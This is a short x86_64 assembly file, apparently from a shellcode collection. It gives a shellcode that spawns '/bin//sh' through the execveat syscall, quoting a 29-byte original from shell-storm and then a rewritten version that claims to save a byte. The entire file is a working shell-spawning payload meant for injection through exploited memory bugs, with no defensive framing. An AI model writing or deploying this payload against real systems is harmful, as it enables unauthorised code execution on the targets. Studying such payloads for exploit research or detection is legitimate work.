; Title :   x86_64 execveat("/bin//sh") 29 bytes shellcode
; From :    http://shell-storm.org/shellcode/files/shellcode-905.php
; Original Code : 
;   6a 42                   push   0x42
;   58                      pop    rax
;   fe c4                   inc    ah

;   48 99                   cqo
;   52                      push   rdx
;   48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
;   2f 73 68
;   57                      push   rdi
;   54                      push   rsp
;   5e                      pop    rsi

;   49 89 d0                mov    r8, rdx
;   49 89 d2                mov    r10, rdx
;   0f 05                   syscall

mov al, 0x42
mov ah, 0x01 ; reduced one byte!

cqo
push rdx
mov rdi, 0x68732f2f6e69622f
push   rdi

push rsp
pop  rsi

mov    r8, rdx
mov    r10, rdx

syscall